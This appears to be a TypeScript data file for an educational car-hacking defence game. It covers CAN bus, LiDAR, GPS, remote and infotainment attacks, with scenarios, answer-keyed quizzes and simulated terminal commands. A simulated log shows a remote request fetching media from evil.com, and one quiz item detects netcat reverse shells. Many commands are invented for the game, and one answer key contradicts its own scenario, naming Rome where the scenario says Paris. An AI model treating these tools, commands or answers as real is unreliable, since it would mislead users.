export interface QuizQuestion {
  question: string
  options: { text: string; isCorrect: boolean }[]
  explanation: string
}

export interface Attack {
  slug: string
  title: string
  tagline: string
  summary: string
  whatis:string
  difficulty: string
  color: string
  scenario: string
  mission: string
  actionBreakdown: string[]
  technicalDetails: string
  realWorldImpact: string
  quiz: QuizQuestion[]
}

export interface Command{
  id: string; 
  command: string;
  expectedOutput: string;
  attackSlug: string;

}

export const attacks: Attack[] = [
  {
  
    slug: "can",
    title: "CAN Bus Spoofing",
    tagline: "The car obeys fake commands — and it doesn't even know it.",
    whatis:"The Controller Area Network (CAN) Bus is the communication backbone of modern vehicles. It allows different electronic control units (ECUs)—like brakes, steering, engine, and lights—to send and receive information. Instead of each component having its own wiring, the CAN Bus acts like a shared digital conversation channel where all parts talk to each other to keep the vehicle running smoothly. A CAN Bus spoofing attack happens when an attacker injects fake messages into the CAN network. These messages imitate legitimate signals, tricking the vehicle into doing things the attacker commands—like turning the wheel, disabling brakes, or locking the doors.",
    summary:
      "Hackers inject false messages into the vehicle's nervous system, altering behavior like lights, brakes, or engine control.",
    difficulty: "Intermediate",
    color: "red",
    scenario:
      `
      "The Ghost Driver Takeover"
Scene:
You start off driving smoothly in manual mode. Everything feels normal—the car responds to your steering, braking, and acceleration just the way it should. You're fully in control…
Until you're not.

What Happens:
Suddenly...

The steering wheel yanks itself violently to the right.

Then to the left—your hands are on the wheel, but you're no longer driving.

The car speeds up, ignoring your attempts to brake.

Every system starts acting strange: dashboard lights flicker, horn blasts randomly, and you lose all control.

You realize the car is no longer listening to you.
You’re not driving anymore—a hacker is.

The Crash:
Before you can react, the car swerves out of lane, dodges into oncoming traffic, and…
CRASH.
The screen flashes red:

“⚠ CAN Bus Compromised – System Hijacked”
      `,
    mission:
      `The Cyber Defender
Now it's your turn to take control — from the attacker:

Analyze the fake CAN signals flooding the system

Isolate the malicious ECU pretending to be the brake or steering module

Send override commands to block spoofed messages

Restore control through terminal commands and reboot the network

Each action helps regain a piece of control.
One mistake... and the car could be hijacked again.

Goal:
Stop the attack.
Recover the vehicle.
Defend the driver's seat.

This is more than a simulation — it’s a race against a cyber intruder inside your car.
Click “Start Attack” to begin your mission.`,
    actionBreakdown: [
      "Access the CAN Network",
      "Monitor Normal Traffic",
      "Inject Spoofed Messages",
      "Observe Vehicle Behavior",
      "Analyze & Improve Attack",

    ],
    technicalDetails:
      "Hackers use tools (like laptops or microcontrollers) to connect to the car’s internal CAN Bus—either through physical access or remotely via vulnerable systems (e.g., infotainment or telematics). Once connected, they send false messages pretending to be from real ECUs. Since CAN lacks authentication, the vehicle accepts them as real.",
    realWorldImpact:
      "CAN Bus attacks are dangerous because they take over core vehicle functions. This means an attacker can remotely control or disable safety features—putting passengers and others on the road at risk. Since most vehicles today still rely on CAN with minimal security, this attack is highly relevant in automotive cybersecurity",
    quiz: [
      {
        question: "What is the primary security weakness that makes CAN Bus spoofing possible?",
        options: [
          { text: "CAN messages are transmitted too slowly", isCorrect: false },
          { text: "The CAN protocol lacks built-in authentication and encryption", isCorrect: true },
          { text: "CAN networks use wireless transmission", isCorrect: false },
          { text: "CAN messages are too large to secure", isCorrect: false },
        ],
        explanation:
          "The original CAN protocol was designed for reliability and speed, not security. It lacks authentication mechanisms, meaning any device on the network can send messages that appear legitimate to other components.",
      },
      {
        question: "Which tool would you use to monitor live CAN bus traffic for suspicious activity?",
        options: [
          { text: "Wireshark with USB capture", isCorrect: false },
          { text: "candump or cansniffer", isCorrect: true },
          { text: "netstat -an", isCorrect: false },
          { text: "tcpdump on eth0", isCorrect: false },
        ],
        explanation:
          "candump and cansniffer are specialized tools for monitoring CAN bus traffic. They can display real-time CAN frames, helping analysts identify unusual message patterns or frequencies that might indicate spoofing attacks.",
      },
      {
        question:
          "If you observe CAN messages with ID 0x123 appearing every 5ms instead of the normal 100ms, what does this likely indicate?",
        options: [
          { text: "The system is operating normally", isCorrect: false },
          { text: "A component is malfunctioning", isCorrect: false },
          { text: "Possible CAN message injection attack", isCorrect: true },
          { text: "The network is running faster than usual", isCorrect: false },
        ],
        explanation:
          "Dramatic changes in message timing patterns often indicate injection attacks. Legitimate ECUs follow predictable timing schedules, so messages appearing much more frequently than normal suggest an attacker is flooding the bus with spoofed messages.",
      },
      {
        question: "What is the most effective countermeasure against CAN Bus spoofing?",
        options: [
          { text: "Increasing message transmission speed", isCorrect: false },
          { text: "Implementing message authentication codes (MACs)", isCorrect: true },
          { text: "Using longer CAN IDs", isCorrect: false },
          { text: "Encrypting the entire vehicle", isCorrect: false },
        ],
        explanation:
          "Message Authentication Codes (MACs) provide cryptographic verification that messages come from legitimate sources. This is the most practical defense against spoofing while maintaining CAN's real-time performance requirements.",
      },
      {
        question:
          "In a CAN Bus spoofing attack targeting the brake system, what CAN ID range would an attacker most likely target?",
        options: [
          { text: "Entertainment system IDs (0x400-0x4FF)", isCorrect: false },
          { text: "Powertrain/chassis control IDs (0x100-0x1FF)", isCorrect: true },
          { text: "Diagnostic IDs (0x7E0-0x7EF)", isCorrect: false },
          { text: "Body control IDs (0x200-0x2FF)", isCorrect: false },
        ],
        explanation:
          "Safety-critical systems like brakes, steering, and engine control typically use lower CAN ID ranges (0x100-0x1FF) which have higher priority on the bus. Attackers target these IDs to affect vehicle safety systems.",
      },
      {
        question: "What should you do first when you suspect a CAN Bus spoofing attack is occurring?",
        options: [
          { text: "Immediately disconnect the OBD-II port", isCorrect: false },
          { text: "Document the attack patterns and preserve evidence", isCorrect: true },
          { text: "Restart the vehicle's computer systems", isCorrect: false },
          { text: "Drive to the nearest service center", isCorrect: false },
        ],
        explanation:
          "Proper incident response requires documenting the attack patterns first. This evidence is crucial for understanding the attack method, developing countermeasures, and potentially identifying the attacker. Hasty actions might destroy valuable forensic evidence.",
      },
    ],
  },
  {
    slug: "lidar",
    title: "LiDAR Spoofing",
    tagline: "The sensors see ghosts — or worse, they see nothing at all.",
   whatis:"LiDAR (Light Detection and Ranging) is an active remote sensing technology that measures distances by emitting laser pulses and analyzing their reflections. By calculating the time it takes for the laser to return after hitting an object, LiDAR systems generate precise 3D maps of environments. This technology is widely utilized in autonomous vehicles (AVs) for accurate perception of surroundings, aiding in navigation and obstacle detection.. A LiDAR spoofing attack involves the deliberate manipulation of LiDAR sensor data by introducing deceptive laser signals. These malicious inputs can cause AVs to perceive false objects or miss real ones, leading to potential misjudgments in navigation and safety systems.",
    summary:
      "Attackers create false LiDAR signals, tricking the car into reacting to fake obstacles or ignoring real ones.",
    difficulty: "Advanced",
    color: "purple",
    scenario:
      `
      "The Deceptive Laser Trap"
Scene:

Your car is driving in autonomous mode, relying on its LiDAR sensor—its "eyes"—to detect the road and surroundings. Everything looks normal... until suddenly, things start to go wrong.

What Happens:

Fake Dangers Appear:
The LiDAR is under attack! It starts detecting phantom objects—like walls or vehicles—that aren't really there. The car panics and hits the brakes multiple times … even though the road is clear. Confused? So is the car.

The Real Danger Begins:
After dodging ghost objects, the car picks up speed and continues driving. But now the attack changes: the LiDAR misses a real object in front of it—like another car BOOOM it crashes. 

The screen flashes a warning:
“⚠ LiDAR Failure - System Compromised”
      `,
    mission:
      `
      You’re no longer just a passenger —
You're the Cyber Defender.

You must:

Inspect the attack and find the fakes

Activate sensor fusion to double-check LiDAR with other sensors

Run terminal commands to kick out the spoofed signals

Reset and recalibrate the system before another disaster strikes

Every correct step brings the system back online.
Every mistake… could cost the next crash.

This Isn’t Just a Simulation — It’s Cyber Warfare on Wheels.
Will you rise to the challenge?
Click “Start Attack” and prove you can stop the LiDAR deception.
      `,
    actionBreakdown: [
      "Understand LiDAR Basics",
      "Analyze Normal vs. Spoofed Data",
      "Perform the Attack",
      "Impact on Vehicle Decisions",
      "Test Detection & Defense",
    ],
    technicalDetails:
      "LiDAR spoofing operates by projecting counterfeit laser pulses that either mimic legitimate signals or overwhelm the sensor. By carefully timing and directing these malicious signals, attackers can alter the LiDAR's perception, causing it to register nonexistent obstacles or ignore actual ones.",
    realWorldImpact:
      "LiDAR spoofing poses significant risks to the safety and reliability of autonomous vehicles. Successful attacks can lead to inappropriate responses, such as sudden braking or failure to avoid obstacles, increasing the likelihood of accidents. As AVs become more prevalent, understanding and mitigating these vulnerabilities is crucial to ensure secure and dependable operation.",
    quiz: [
      {
        question: "What physical principle do LiDAR systems use to measure distance to objects?",
        options: [
          { text: "Doppler shift of reflected radio waves", isCorrect: false },
          { text: "Time-of-flight measurement of laser pulses", isCorrect: true },
          { text: "Triangulation using multiple cameras", isCorrect: false },
          { text: "Magnetic field strength variations", isCorrect: false },
        ],
        explanation:
          "LiDAR measures the time it takes for laser pulses to travel to an object and return. By knowing the speed of light and measuring this time-of-flight, the system can calculate precise distances to create detailed 3D point clouds.",
      },
      {
        question: "How can an attacker create false LiDAR returns to spoof obstacle detection?",
        options: [
          { text: "By jamming the LiDAR receiver with radio frequency interference", isCorrect: false },
          { text: "By using a laser pointer to inject fake return signals", isCorrect: true },
          { text: "By placing mirrors around the vehicle", isCorrect: false },
          { text: "By hacking the vehicle's computer network", isCorrect: false },
        ],
        explanation:
          "Attackers can use laser devices operating at the same wavelength as the LiDAR system to inject false return signals. These spoofed returns can create phantom objects or mask real obstacles, fooling the perception system.",
      },
      {
        question: "What is the most effective way to detect LiDAR spoofing attacks?",
        options: [
          { text: "Increase the LiDAR scanning frequency", isCorrect: false },
          { text: "Use sensor fusion with cameras and radar", isCorrect: true },
          { text: "Install multiple identical LiDAR units", isCorrect: false },
          { text: "Encrypt the LiDAR data transmission", isCorrect: false },
        ],
        explanation:
          "Sensor fusion combines data from multiple sensor types (LiDAR, cameras, radar) to cross-validate detections. If LiDAR shows an obstacle but cameras and radar don't detect anything, this inconsistency suggests possible spoofing.",
      },
      {
        question: "Which characteristic of spoofed LiDAR data might help identify an attack?",
        options: [
          { text: "Points appearing at impossible distances", isCorrect: false },
          { text: "Sudden appearance of perfectly geometric shapes", isCorrect: true },
          { text: "Reduced point cloud density", isCorrect: false },
          { text: "Changes in laser wavelength", isCorrect: false },
        ],
        explanation:
          "Spoofed LiDAR attacks often create artificial geometric patterns that don't match natural environmental features. Real-world objects have irregular surfaces, while spoofed returns might create unnaturally perfect shapes or patterns.",
      },
      {
        question: "What safety risk does LiDAR spoofing pose to autonomous vehicles?",
        options: [
          { text: "Increased fuel consumption", isCorrect: false },
          { text: "False emergency braking or failure to detect real obstacles", isCorrect: true },
          { text: "Reduced GPS accuracy", isCorrect: false },
          { text: "Interference with radio communications", isCorrect: false },
        ],
        explanation:
          "LiDAR spoofing can cause autonomous vehicles to brake for non-existent obstacles (creating traffic hazards) or fail to detect real obstacles (risking collisions). Both scenarios pose serious safety risks to passengers and other road users.",
      },
      {
        question: "Which LiDAR system characteristic makes it most vulnerable to spoofing attacks?",
        options: [
          { text: "High power consumption", isCorrect: false },
          { text: "Reliance on external light sources", isCorrect: false },
          { text: "Lack of signal authentication", isCorrect: true },
          { text: "Limited range capabilities", isCorrect: false },
        ],
        explanation:
          "Like many sensor systems, LiDAR lacks built-in authentication mechanisms to verify that return signals are legitimate. The system assumes all received light pulses at the correct wavelength are valid returns from its own transmitted pulses.",
      },
      {
        question: "What countermeasure could help prevent LiDAR spoofing while maintaining system performance?",
        options: [
          { text: "Using randomized laser pulse patterns", isCorrect: true },
          { text: "Increasing the laser power output", isCorrect: false },
          { text: "Reducing the scanning resolution", isCorrect: false },
          { text: "Installing physical shields around sensors", isCorrect: false },
        ],
        explanation:
          "Randomized pulse patterns make it much harder for attackers to synchronize their spoofing signals with the legitimate LiDAR pulses. This technique adds authentication without significantly impacting the system's real-time performance requirements.",
      },
    ],
  },
  {
    slug: "gps",
    title: "GPS Spoofing",
    tagline: "The map says left. The car should go right. You're lost — on purpose.",
    whatis:"GPS spoofing is a cyberattack where counterfeit signals are transmitted to deceive GPS receivers, causing them to compute incorrect positions or times. Unlike jamming, which blocks signals, spoofing provides false data, leading systems to operate based on fabricated information.",
    summary: "Fake GPS signals mislead the vehicle's navigation system, causing disorientation and potential hazards.",
    difficulty: "Beginner",
    color: "blue",
    scenario:
      `
      "The Phantom GPS Switch"
Scene:
You're gliding smoothly through the streets of Paris, the city of lights. Your autonomous car is in full control, GPS locked, and everything looks perfect.
Latitude and longitude readings are clean. The dashboard proudly says:
Location: Paris, France

But then… something strange happens.
Coordinates start jumping.
The city name changes.
Now showing: Amman, Jordan.

Before you can react — the car changes direction on its own. It’s no longer following the intended route. You’re watching a vehicle being misled by spoofed GPS signals. The system doesn’t realize it’s being tricked…

The screen flashes:
⚠ GPS Spoofing Detected - Navigation Compromised

What Happens:
Normal GPS Phase:
The car navigates correctly, with location and path matching reality.

Attack Phase Begins:
A red warning border flashes. Suddenly, the GPS starts updating with random, fast-changing coordinates.

Fake Location Injected:
Paris is replaced by Amman. The car follows a path that doesn’t match the real world, blindly trusting fake GPS data.

      `,
    mission:
      `
      You're not just a passenger anymore —
You’re the Cyber Defender.

You must:

Detect the Attack
Monitor the sudden changes in GPS values and city names. Something doesn’t add up — can you catch it?

Launch Terminal Mitigation
Use command-line tools to block GPS inputs and switch to safe navigation mode.

Recalibrate Navigation
Reset the system, discard spoofed coordinates, and guide the car back to its true path.

This is no ordinary drive —
It’s a cyber trap disguised as a road.

Will you stop the spoofing before it’s too late?

Click “Start Attack” and prove you can outsmart GPS manipulation.
      `,
    actionBreakdown: [
      "Setup Spoofing Device",
      "Overpower Real Signals",
      "Send Fake Coordinates",
      "Misguide the Vehicle",
      "Maintain or Shift Spoofed Path",
      
    ],
    technicalDetails:
      "GPS receivers determine location by analyzing signals from multiple satellites. Spoofers exploit this by emitting stronger, fake signals that mimic legitimate ones. The receiver locks onto these counterfeit signals, resulting in erroneous location or time data.",
    realWorldImpact:
      "GPS spoofing poses serious risks to both civilian and military applications. For connected and autonomous vehicles, GPS spoofing can lead to navigation errors, route manipulation, and potential safety hazards. Real-world incidents have included ships being misdirected and drones being captured through GPS manipulation. As vehicles become more dependent on GPS for navigation and timing, understanding these vulnerabilities becomes critical for ensuring transportation security and developing resilient positioning systems.",
    quiz: [
      {
        question: "What unusual behavior was first noticed that hinted at GPS spoofing?",
        options: [
          { text: "The navigation system crashed repeatedly", isCorrect: false },
          { text: "The screen showed a foreign location (like Rome instead of Amman)", isCorrect: true },
          { text: "The GPS signal was completely lost", isCorrect: false },
          { text: "The vehicle's clock was incorrect", isCorrect: false },
        ],
        explanation: "GPS was tricked into showing a false location, misleading the navigation system.",
      },
      {
        question: "Which port was exposed and used to inject spoofed GPS coordinates?",
        options: [
          { text: "22 (SSH)", isCorrect: false },
          { text: "80 (HTTP)", isCorrect: false },
          { text: "2947 (gpsd)", isCorrect: false },
          { text: "5555", isCorrect: true },
        ],
        explanation: "gpsd typically runs on 2947, but custom systems often expose GPS ports like 5555.",
      },
      {
        question: "What command is used to monitor GPS activity and detect sudden jumps?",
        options: [
          { text: "gpsmon --live", isCorrect: true },
          { text: "gpstrace -a", isCorrect: false },
          { text: "tail -f /var/log/gps.log", isCorrect: false },
          { text: "netstat -gps", isCorrect: false },
        ],
        explanation: "This displays real-time GPS data — critical for spotting spoofed location jumps.",
      },
      {
        question: "How do you check if a suspicious GPS API port is open?",
        options: [
          { text: "ps aux | grep gps", isCorrect: false },
          { text: "lsof -i", isCorrect: false },
          { text: "netstat -tuln | grep LISTEN", isCorrect: true },
          { text: "nmap localhost", isCorrect: false },
        ],
        explanation: "Shows active TCP/UDP ports — confirms if GPS API is exposed to network.",
      },
      {
        question: "How do you block the attacker's IP from sending spoofed data?",
        options: [
          { text: "iptables -A INPUT -s 192.168.1.72 -j DROP", isCorrect: false },
          { text: "ufw deny from 192.168.1.72 to any port 5555", isCorrect: true },
          { text: "route add 192.168.1.72 reject", isCorrect: false },
          { text: "firewall-cmd --block=192.168.1.72", isCorrect: false },
        ],
        explanation: "A simple firewall rule that prevents further remote GPS manipulation.",
      },
      {
        question: "How do you restrict GPS API to local-only access?",
        options: [
          { text: "gps-sec --restrict --ip 127.0.0.1", isCorrect: true },
          { text: "gpsd -n -G -D 5", isCorrect: false },
          { text: "echo 'localhost' > /etc/gpsd/allowed.conf", isCorrect: false },
          { text: "systemctl mask gpsd-network", isCorrect: false },
        ],
        explanation: "Ensures only localhost can send commands to the GPS interface.",
      },
    ],
  },
  {
    slug: "remote",
    title: "Remote Hijacking",
    tagline: "You're no longer in control. Someone else is driving — remotely.",
    whatis:"Remote hijacking is a cyberattack where an unauthorized individual gains control over a vehicle without physical access. This is achieved by exploiting vulnerabilities in the vehicle's wireless communication systems—such as Wi-Fi, Bluetooth, cellular networks, or connected applications—to send malicious commands to the car's internal systems. Through these compromised channels, attackers can manipulate critical functions like steering, braking ,lights, acceleration, and door locks from a remote location. Such attacks pose significant safety risks, as they can lead to unauthorized control over the vehicle's operations, endangering both the occupants and others on the road.",
    summary: "Wireless exploits let hackers take control of driving systems like acceleration and steering.",
    difficulty: "Expert",
    color: "red",
    scenario:
      `
      "Hijacked from Nowhere"
Scene:
You're driving the car manually.
The road is clear, and everything feels smooth.
Steering? 
Brakes? 
You’re fully in control…
Until the car gets a message you didn’t send.

What Happens:
Out of nowhere…

The headlights start flashing rapidly.

The interior lights blink on and off, like a warning—but no alert appears.

You try to fix it, but then—the steering glitches.

The wheel suddenly pulls to the right.

You fight it… but it keeps turning right in a tight circle, over and over.

Your steering and lights are no longer responding.

You're still holding the wheel.
But the car is no longer listening.
You’ve been remotely hijacked.

The Crash:
You try to regain control—nothing works.
Lights flashing. Steering stuck.
The car spins out of control… and crashes.

A red alert takes over the screen:
“⚠ Remote Access Breach – Manual Override Failed”
      `,
    mission:
      `
      The Cyber Defender
You're now behind the keyboard to stop the invisible hacker.
You must:

Trace the remote connection back to the compromised interface

Identify which system was hijacked — lights, steering, or more

Execute commands to cut the hacker’s control line

Reinforce security and switch to local-only driving mode

Each correct move weakens the attacker.
Each wrong one… gives them more time.

Goal:
End the hijack.
Recover full control.
Secure the vehicle.

You’re not just a driver anymore — you’re the firewall between the hacker and the highway.
Click “Start Attack” to begin your defense mission.
      `,
    actionBreakdown: [
      "Identify Vulnerability",
      "Gain Remote Access",
      "Inject Malicious Commands",
      "Take Control of the Vehicle",
      "Maintain Access or Cover Tracks",
      
      
    ],
    technicalDetails:
      " Modern vehicles are equipped with various wireless communication channels, like infotainment systems, telematics units, over-the-air (OTA) update platforms, and smartphone connectivity. If these systems are not well secured, attackers can exploit them to gain a foothold.",
    realWorldImpact:
      "Remote hijacking can lead to total loss of driver control, accidents, privacy breaches, and even targeted harm. Some high-profile demonstrations have shown vehicles being remotely shut down on highways, or rerouted without the driver’s consent. This threat highlights the urgent need for stronger cybersecurity in smart and connected vehicles.",
    quiz: [
      {
        question: "How would you detect if suspicious CAN messages are being injected into the car's network?",
        options: [
          { text: "Run a malware scan on the infotainment system", isCorrect: false },
          { text: "Use canmon --watch to inspect CAN traffic", isCorrect: true },
          { text: "Check the vehicle's task manager", isCorrect: false },
          { text: "Disconnect the car battery and restart", isCorrect: false },
        ],
        explanation: "Monitors live CAN messages, useful to detect injected commands.",
      },
      {
        question: "What does this tell you about the attacker's control?",
        options: [
          { text: "They are controlling the infotainment UI only", isCorrect: false },
          { text: "They are physically inside the car", isCorrect: false },
          { text: "They've gained access to the internal CAN network", isCorrect: true },
          { text: "It's just a logging glitch", isCorrect: false },
        ],
        explanation: "If motion and light commands are hijacked, it's a CAN-level exploit.",
      },
      {
        question: "Which command helps you confirm if the CAN interface is active?",
        options: [
          { text: "ip link show", isCorrect: true },
          { text: "lsusb | grep CAN", isCorrect: false },
          { text: "ifconfig can0", isCorrect: false },
          { text: "can-status --check", isCorrect: false },
        ],
        explanation: "Lists interfaces — if can0 is UP, it's open to injection.",
      },
      {
        question: "You suspect a remote shell is active. How do you confirm it?",
        options: [
          { text: "Check system logs", isCorrect: false },
          { text: "Run antivirus scan", isCorrect: false },
          { text: "ps aux | grep nc", isCorrect: true },
          { text: "ping localhost", isCorrect: false },
        ],
        explanation: "nc is common in reverse shells — this command finds it.",
      },
      {
        question: "Which action stops CAN control immediately?",
        options: [
          { text: "Disable the CAN interface", isCorrect: true },
          { text: "Restart the infotainment system", isCorrect: false },
          { text: "Update the firmware", isCorrect: false },
          { text: "Change the Wi-Fi password", isCorrect: false },
        ],
        explanation: "ip link set can0 down kills all CAN messages instantly.",
      },
      {
        question: "After finding the attacker's IP, how do you block it?",
        options: [
          { text: "Run netlog --blacklist <attacker_ip>", isCorrect: true },
          { text: "Disable all network interfaces", isCorrect: false },
          { text: "Factory reset the vehicle", isCorrect: false },
          { text: "Change the vehicle's IP address", isCorrect: false },
        ],
        explanation: "Blacklisting blocks future communication from that IP.",
      },
    ],
  },
  {
    slug: "multimedia",
    title: "Multimedia Hijacking",
    tagline: "The screen flickers. Strange audio plays. You're being watched.",
    whatis:"Multimedia hijacking is a cyberattack that targets a vehicle’s infotainment system, allowing an attacker to manipulate the car's screens, audio, navigation, and connected apps. While it may seem less dangerous than steering or braking attacks, multimedia hijacking can be used to distract the driver, display false information, or even cause panic, paving the way for more severe actions.",
    summary: "The infotainment system has been compromised,Attackers might inject unauthorized audio content distractions while driving.",
    difficulty: "Intermediate",
    color: "orange",
    scenario:
      `"The Phantom DJ"
Scene:
You're driving your car manually, enjoying a peaceful ride. The dashboard is calm, and everything seems normal.
Suddenly, the radio turns on by itself, blasting unfamiliar sounds. A distorted 
      voice cuts through the noise: "I'm in control now."
What Happens:
The infotainment system activates without your input.
      Unusual sounds and a hacker's voice play through the speakers.
Attempts to adjust or turn off the radio fail.
The system becomes unresponsive, leaving you distracted and concerned.
The Danger:
This isn't just a prank. The attacker is exploiting vulnerabilities in your car's multimedia system to distract and unsettle you. While the vehicle's core functions remain unaffected, your focus is compromised, increasing the risk of an accident
      `,
    mission:
      `
      The Cyber Defender
You must act swiftly to neutralize the threat:

Identify the source of the unauthorized audio.

Access the infotainment system's diagnostics.

Terminate the rogue audio stream.

Secure the multimedia system against further intrusions.

Each correct action restores control and ensures your safety.

Goal:
Eliminate the distraction. Regain control of the multimedia system. Ensure a safe driving experience.

Ready to face the Phantom DJ?
Click “Start Attack” to begin your mission.
      `,
    actionBreakdown: [
      "Exploit Infotainment Vulnerability",
      "Gain Unauthorized Access",
      "Inject Malicious Media Commands",
      "Hijack Audio/Video Output",
      "Maintain or Escalate Control",
      
    ],
    technicalDetails:
      "Infotainment systems are connected to various components, including Bluetooth, USB ports,     Wi-Fi, GPS, and smartphone integration. If the attacker gains access—through a malicious file, remote connection, or unpatched vulnerability—they can:",
    realWorldImpact:
      "Multimedia hijacking is a growing threat, especially as cars become more “connected.” It can be used for psychological disruption, phishing-style deceptions (fake warnings, GPS rerouting), or coordination with larger attacks (like remote hijacking or spoofing). Even without physical control, a hacker can manipulate what the driver sees and hears, breaking trust in the system.",
    quiz: [
      {
        question: "What is the most common entry point for multimedia hijacking attacks in vehicles?",
        options: [
          { text: "Direct access to the CAN bus", isCorrect: false },
          { text: "Compromised USB ports or Bluetooth connections", isCorrect: true },
          { text: "Physical tampering with display screens", isCorrect: false },
          { text: "GPS signal manipulation", isCorrect: false },
        ],
        explanation:
          "USB ports and Bluetooth connections are common attack vectors because they're designed for user interaction and often have fewer security controls. Malicious USB devices or compromised Bluetooth connections can install malware on infotainment systems.",
      },
      {
        question: "How can you detect if a vehicle's microphone is being accessed without authorization?",
        options: [
          { text: "Check for unusual battery drain", isCorrect: false },
          { text: "Monitor process lists for unexpected audio recording applications", isCorrect: true },
          { text: "Look for changes in radio reception", isCorrect: false },
          { text: "Test the horn functionality", isCorrect: false },
        ],
        explanation:
          "Unauthorized microphone access typically involves running audio recording processes. Monitoring the system's process list (using commands like 'ps' or 'top') can reveal unexpected applications that are accessing audio devices without user consent.",
      },
      {
        question: "What type of content might attackers display to psychologically manipulate drivers?",
        options: [
          { text: "Normal navigation maps", isCorrect: false },
          { text: "Disturbing images, threatening messages, or distracting videos", isCorrect: true },
          { text: "Vehicle diagnostic information", isCorrect: false },
          { text: "Weather updates", isCorrect: false },
        ],
        explanation:
          "Attackers may display disturbing, threatening, or highly distracting content to cause psychological distress, impair driving ability, or coerce victims into specific actions. This represents both a safety hazard and a form of digital harassment.",
      },
      {
        question: "Which file system location would most likely contain evidence of unauthorized multimedia access?",
        options: [
          { text: "/var/log/ directory for system logs", isCorrect: true },
          { text: "/boot/ directory for startup files", isCorrect: false },
          { text: "/etc/ directory for configuration files", isCorrect: false },
          { text: "/usr/ directory for user programs", isCorrect: false },
        ],
        explanation:
          "The /var/log/ directory contains system logs that record application activities, including audio/video access attempts. These logs can provide evidence of when multimedia devices were accessed and by which processes.",
      },
      {
        question: "What privacy risk does compromised vehicle multimedia pose beyond surveillance?",
        options: [
          { text: "Increased fuel consumption", isCorrect: false },
          { text: "Location tracking and behavioral profiling", isCorrect: true },
          { text: "Reduced engine performance", isCorrect: false },
          { text: "GPS navigation errors", isCorrect: false },
        ],
        explanation:
          "Compromised multimedia systems can enable comprehensive surveillance including location tracking, conversation recording, and behavioral analysis. This data can be used for stalking, blackmail, corporate espionage, or building detailed profiles of victims' daily activities.",
      },
      {
        question: "How can drivers protect themselves from multimedia hijacking attacks?",
        options: [
          { text: "Disable all infotainment features permanently", isCorrect: false },
          { text: "Regularly update software and avoid untrusted USB devices", isCorrect: true },
          { text: "Cover all cameras with tape", isCorrect: false },
          { text: "Only use the vehicle during daylight hours", isCorrect: false },
        ],
        explanation:
          "The most practical protection involves keeping infotainment software updated to patch vulnerabilities and being cautious with USB devices and Bluetooth connections. Regular security updates and avoiding untrusted devices significantly reduce attack risk while maintaining functionality.",
      },
      {
        question: "What should you do if you suspect your vehicle's multimedia system has been compromised?",
        options: [
          { text: "Continue using the system but avoid sensitive conversations", isCorrect: false },
          { text: "Document the suspicious behavior and disconnect from networks", isCorrect: true },
          { text: "Immediately sell the vehicle", isCorrect: false },
          { text: "Only drive with the radio turned off", isCorrect: false },
        ],
        explanation:
          "If compromise is suspected, document the suspicious behavior for evidence, then disconnect the system from wireless networks and disable multimedia features until the system can be professionally inspected and cleaned. This prevents further data theft while preserving evidence.",
      },
    ],
  },
]


export const commands: Command[] = [
  {
    id: "can-1",
    command: "canmon",
    expectedOutput: `[INFO] Monitoring CAN bus...
   [DATA] ID 0x30: throttle=0.4
   [DATA] ID 0x45: steer=0.2
   [ALERT] ID 0x66: throttle=1.0 (suspicious)
   [ALERT] ID 0x66: steer=1.0 (suspicious)`,
  
  
    attackSlug: "can",
    
  },

{
    id: "can-2", 
    command: "canlog --ids",
    expectedOutput: `ID     Msg/s    Function
    0x30   2.1      Throttle ECU
    0x45   2.0      Steering ECU
    0x66   9.9    Unknown - High frequency`,
    attackSlug: "can"
  },
  {

  id: "can-3", 
    command: "canlog --id 0x66",
    expectedOutput: `[LOG] 0x66 → throttle=1.0, steer=1.0
    [LOG] 0x66 → throttle=1.0, steer=1.0
    [LOG] 0x66 → throttle=1.0, steer=1.0`,
    attackSlug: "can"
},
{

  id: "can-4", 
    command: "obdscan --devices",
    expectedOutput: `[1] ECU: Engine Control Module
    [2] ECU: Steering Control Module
    [3] UNKNOWN DEVICE [ID 0x66] - source: OBD-II`,
    attackSlug: "can"
},
{

  id: "can-5", 
    command: "canban block 0x66",
    expectedOutput: "[SUCCESS] Blocked all messages from ID 0x66",
    attackSlug: "can"
},
{

  id: "can-6", 
    command: "obdscan --remove 0x66",
    expectedOutput: "[SUCCESS] Foreign device on OBD-II port isolated",
    attackSlug: "can"
},
{

  id: "can-7", 
    command: "firewall --reload",
    expectedOutput: `[INFO] Filtering rules reloaded
    [SECURE] CAN bus stabilized. Manual control restored.`,
    attackSlug: "can"
},
{

  id: "multimedia-1", 
    command: "multimeda-mon",
    expectedOutput: `[INFO] Monitoring infotainment system logs...
    [AUDIO] Playback triggered at 16:02:34
    [SOURCE] HTTP Stream: http://evil.com/voice.mp3
    [CHANNEL] Internal OS API call
    [ALERT] Unexpected media request from remote IP: 100.82.45.111`,
    attackSlug: "multimedia"
},

{

  id: "multimedia-2", 
    command: "netstat -tuln",
    expectedOutput: `Proto  Local Address          State
    tcp    0.0.0.0:8080           LISTEN  ←  Media API (Unauthenticated)
    tcp    0.0.0.0:5555           LISTEN  ←  ADB Interface (Remote Debug)`,
    attackSlug: "multimedia"
},
{

  id: "multimedia-3", 
    command: "netlog --last 10",
    expectedOutput: `[16:02:34] Connection from 100.82.45.111 to port 8080
    [16:02:35] POST /api/play { "file": "http://evil.com/voice.mp3" }`,
    attackSlug: "multimedia"
},
{

  id: "multimedia-4", 
    command: "firewall --block 8080",
    expectedOutput: "[✔] Port 8080 has been blocked from external access",
    attackSlug: "multimedia"
},
{

  id: "multimedia-5", 
    command: "adbconfig --disable-remote",
    expectedOutput: "[✔] Remote ADB access disabled",
    attackSlug: "multimedia"
},
{

  id: "multimedia-6", 
    command: "media-sec --enforce-auth on",
    expectedOutput: "[✔] All future media API calls now require authentication token",
    attackSlug: "multimedia"
},
{

  id: "multimedia-7", 
    command: "netlog --blacklist 100.82.45.111",
    expectedOutput: "[✔] IP 100.82.45.111 has been blacklisted from all future connections",
    attackSlug: "multimedia"
},
{

  id: "multimedia-8", 
    command: "multimeda-mon",
    expectedOutput: `[STATUS] No suspicious playback
    [STATUS] Media API: Secured
    [STATUS] Remote ADB: Disabled`,
    attackSlug: "multimedia"
},
{

  id: "remote-1", 
    command: "canmon --watch",
    expectedOutput: `[DATA] ID 0x21A: 01FF000000000000 ← Lights ON
    [DATA] ID 0x130: FF00000000000000 ← Throttle
   [ALERT] Repeated spoofed signals from internal system`,
    attackSlug: "remote"
},
{

  id: "remote-2", 
    command: "ip link show",
    expectedOutput: "can0: <UP,LOWER_UP> mtu 16 ...",
    attackSlug: "remote"
},
{

